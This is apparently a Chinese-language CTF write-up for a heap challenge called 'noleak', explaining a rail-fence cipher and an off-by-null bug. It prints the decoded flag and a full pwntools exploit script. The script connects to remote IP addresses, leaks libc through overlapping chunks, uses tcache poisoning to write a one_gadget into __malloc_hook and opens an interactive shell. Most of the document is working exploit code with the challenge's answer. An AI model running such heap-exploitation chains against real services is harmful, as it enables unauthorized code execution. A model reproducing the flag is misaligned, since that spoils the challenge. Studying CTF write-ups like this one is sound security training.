通过观察可以发现有一个栅栏加密。并且存在offbynull漏洞

1.通过栅栏加密利用char为1byte，unsigned int为4byte的特性，加了个一个简单的栅栏加密字符串，解密只需将unsigned int类型的enc密文先转为单字节的char类型，然后进行栅栏为4的栅栏解密。

2.利用溢出漏洞修改size，将其free后再次malloc可以通过show泄露其地址。

3.利用tcache的特点，可以通过tcache_attack进行攻击，向malloc_hook中写入one_gadget.

4.再次调用malloc即可getshell



#--------------------------------------
	a=[0x5f5f794e,0x63745f30,0x7448315f,0x37656e70]
	b=[]
	for i in range(4):
	    tmp=a[i]
	    for j in range(4):
	        b.append(chr(tmp&0xff))
	        tmp=tmp>>8
	flag=''
	for i in range(4):
	    for j in range(4):
	        flag+=b[i+4*j]
	print(flag)
	#N0_py_1n_tHe_ct7

#---------------------------------------


	#! /usr/bin/python3
	from pwn import *
	from LibcSearcher import *
	#sh=remote("47.108.195.119",20182)
	sh=remote("101.35.18.209",20112)
	context.log_level = 'debug'
	libc=ELF('./libc.so.6')
	elf = ELF('./noleak')
	#sh=process('./noleak')
	
	r   =  lambda x : io.recv(x)
	ra  =  lambda   : io.recvall()
	rl  =  lambda   : io.recvline(keepends = True)
	ru  =  lambda x : io.recvuntil(x, drop = True)
	s   =  lambda x : io.send(x)
	sl  =  lambda x : io.sendline(x)
	sa  =  lambda x, y : io.sendafter(x, y)
	sla =  lambda x, y : io.sendlineafter(x, y)
	ia  =  lambda : io.interactive()
	c   =  lambda : io.close()
	li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
	
	context.log_level='debug'
	
	def choice(elect):
		sh.recvuntil('4) delete a chunk\n')
		sh.sendline(str(elect))
	
	def add(index,size):
		choice(1)
		sh.recvuntil('?')
		sh.sendline(str(index))
		sh.recvuntil('?')
		sh.sendline(str(size))
	
	def edit(index,content,full=False):
		choice(3)
		sh.recvuntil('?')
		sh.sendline(str(index))
		sh.recvuntil(':')
		if full:
			sh.send(content)
		else:
			sh.sendline(content)
	
	def show(index):
		choice(2)
		sh.recvuntil('?')
		sh.sendline(str(index))
	
	def delete(index):
		choice(4)
		sh.recvuntil('?')
		sh.sendline(str(index))
	
	def exploit():
		li('exploit...')
		#--------------------------------
	#	sh.recvuntil("名称:")
	#	sh.sendline("")
	#	sh.recvuntil("名字:")
	#	sh.sendline("")
		#--------------------------------
	
		sh.sendlineafter("start !\n","N0_py_1n_tHe_ct7")
	
		add(0,0x80) #A
		add(1,0x18) #B
		add(2,0xf0) #C
		for i in range(7):
			add(i+3,0x80)
	
		for i in range(7):
			delete(i+3)
			add(i+3,0xf0)
	
		for i in range(7):
			delete(i+3)
		delete(0)
		#gdb.attach(sh)
		edit(1,b'\x00'*0x10+p64(0xb0),full=True)
		delete(2)
		#gdb.attach(sh)
	
		for i in range(8):
			add(3,0x80)
		show(1)
		sh.recvuntil('\n',drop=True)
		libc_base=u64(sh.recvuntil('\n',drop=True).replace(b'\n',b'').ljust(8,b'\x00')) - 0x70 - libc.sym['__malloc_hook']
		malloc_hook=libc_base+libc.symbols['__malloc_hook']
		realloc=libc_base+libc.symbols['realloc']
		gadget=[0x41602,0x41656,0xdeec2]
		onegadget=libc_base+gadget[2]
	
		print(libc_base)
		print(malloc_hook)
		print(onegadget)
		#gdb.attach(sh)
	
		add(2,0x10)
		delete(2)
		edit(1,p64(malloc_hook-0x8) )
		add(3,0x10)
		add(4,0x18)
		edit(4,p64(onegadget)+p64(onegadget))
		#gdb.attach(sh)
		add(1,0x10)
		sh.interactive()
	
	if __name__ == '__main__':
	    exploit()
	    finish()